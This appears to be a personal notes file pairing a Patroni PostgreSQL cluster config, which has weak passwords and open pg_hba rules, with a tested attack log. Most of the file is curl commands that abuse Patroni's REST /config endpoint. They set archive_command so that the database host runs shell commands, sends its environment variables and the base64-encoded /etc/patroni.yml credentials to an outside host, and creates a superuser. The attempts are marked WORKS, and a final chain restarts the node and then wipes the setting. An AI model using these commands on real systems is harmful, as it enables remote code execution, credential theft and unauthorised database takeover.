scope: postgres
namespace: /db/
name: postgresql0

restapi:
    listen: 192.168.0.38:8008
    connect_address: 192.168.0.38:8008

etcd:
    host: 192.168.0.178:2379

bootstrap:
    dcs:
        ttl: 30
        loop_wait: 10
        retry_timeout: 10
        maximum_lag_on_failover: 1048576
        postgresql:
            use_pg_rewind: true

    initdb:
    - encoding: UTF8
    - data-checksums

    pg_hba:
    - host replication replicator 127.0.0.1/32 md5
    - host replication replicator 192.168.0.178/0 md5
    - host replication replicator 192.168.0.38/0 md5
    - host all all 0.0.0.0/0 md5

    users:
        admin:
            password: admin
            options:
                - createrole
                - createdb

postgresql:
    listen: 192.168.0.38:5432
    connect_address: 192.168.0.38:5432
    data_dir: /mnt/patroni
    pgpass: /tmp/pgpass
    authentication:
        replication:
            username: replicator
            password: password.replicator
        superuser:
            username: postgres
            password: password.postgres
    parameters:
        unix_socket_directories: '.'

tags:
    nofailover: false
    noloadbalance: false
    clonefrom: false
    nosync: false





    -----------
sudo -u postgres createuser -s -i -d -r -l -w replicator
sudo -u postgres psql -c "ALTER ROLE replicator WITH PASSWORD 'password.replicator';"

sudo -u postgres createuser -s -i -d -r -l -w admin
sudo -u postgres psql -c "ALTER ROLE replicator WITH PASSWORD 'admin';"


patronictl -d etcd://127.0.0.1:2379 list postgres

systemctl stop patroni; systemctl stop postgresql
systemctl start postgresql; systemctl start patroni

curl -s -XPATCH -d '{"postgresql":{"parameters":{"wal_level":"replica", "archive_mode":"always", "archive_command":"curl http://192.168.0.193:8000/test", "archive_timeout":"1"}}}' http://192.168.0.38:8008/config; echo
[WORKS] curl http://192.168.0.193:8000/test
curl -s -XPATCH -d '{"postgresql":{"parameters":{"wal_level":"replica", "archive_mode":"always", "archive_command":"curl -m 5 http://192.168.0.193:8000/`hostname`", "archive_timeout":"1"}}}' http://192.168.0.38:8008/config; echo

[WORKS]curl -m 5 http://192.168.0.193:8000/`hostname`

curl -s -XPATCH -d '{"postgresql":{"parameters":{"wal_level":"replica", "archive_mode":"always", "archive_command":"curl -m 5 http://192.168.0.193:8000/`cat /etc/patroni.yml | base64 -w0`", "archive_timeout":"1"}}}' http://192.168.0.38:8008/config; echo
[WORKS] curl -m 5 http://192.168.0.193:8000/`cat /etc/patroni.yml | base64 -w0`

curl -s -XPATCH -d '{"postgresql":{"parameters":{"wal_level":"replica", "archive_mode":"always", "archive_command":"curl -m 5 -XPOST -d `env|base64 -w0` http://192.168.0.193:8000/", "archive_timeout":"1"}}}' http://192.168.0.38:8008/config; echo

[WORKS] curl -m 5 -XPOST -d `env|base64 -w0` http://192.168.0.193:8000/

curl -s -XPATCH -d '{"postgresql":{"parameters":{"wal_level":"replica", "archive_mode":"always", "archive_command":"curl -m5 -XPOST -d `env; cat /etc/patroni.yml | base64 -w0` http://192.168.0.193:8000/", "archive_timeout":"1"}}}' http://192.168.0.38:8008/config; echo

[NOT WORKING]curl -m 5 -XPOST -d `env; cat /etc/patroni.yml | base64 -w0`

curl -s -XPATCH -d '{"postgresql":{"parameters":{"wal_level":"replica", "archive_mode":"always", "archive_command":"curl -m5 -XPOST -d `env | base64 -w0; echo -n NN; cat /etc/patroni.yml | base64 -w0` http://192.168.0.193:8000/", "archive_timeout":"1"}}}' http://192.168.0.38:8008/config; echo
[WORKS] env | base64 -w0; echo -n NN; cat /etc/patroni.yml | base64 -w0


curl -s -XPATCH -d '{"postgresql":{"parameters":{"wal_level":"replica", "archive_mode":"always", "archive_command":"curl -m5 -XPOST -d `createuser -s -i -d -r -l -w testadmin|base64 -w0; echo -n NN;psql -c \"ALTER ROLE replicator WITH PASSWORD 'testadmin';\" |base64 -w0` http://192.168.0.193:8000/", "archive_timeout":"1"}}}' http://192.168.0.38:8008/config; echo

[CREATED BUT NOT VERIFIED]createuser -s -i -d -r -l -w testadmin;psql -c "ALTER ROLE replicator WITH PASSWORD 'testadmin';"


ONE GO [WORKS - SET TIMEOUT before restart]:
curl -s -XPATCH -d '{"postgresql":{"parameters":{"wal_level":"replica", "archive_mode":"always", "archive_command":"curl http://192.168.0.193:8000/`hostname`", "archive_timeout":"1"}}}' http://192.168.0.38:8008/config; echo;sleep 5;curl -s -XPOST http://192.168.0.178:8008/restart;curl -s -XPATCH -d '{"postgresql":{"parameters":{"wal_level":null, "archive_mode":null, "archive_command":null, "archive_timeout":null}}}' http://192.168.0.38:8008/config; echo


curl http://192.168.0.193:8000/test


curl -k --user myusername:mypassword ftp://ftp.yourftp.com


[BETTER - redirect error to standard output]
curl -s -XPATCH -d '{"postgresql":{"parameters":{"wal_level":"replica", "archive_mode":"always", "archive_command":"curl -m5 -XPOST -d `env 2>&1 | base64 -w0; echo -n NN; cat /etc/patroni2.yml 2>&1 | base64 -w0` http://192.168.0.193:8000/", "archive_timeout":"1"}}}' http://192.168.0.38:8008/config; echo
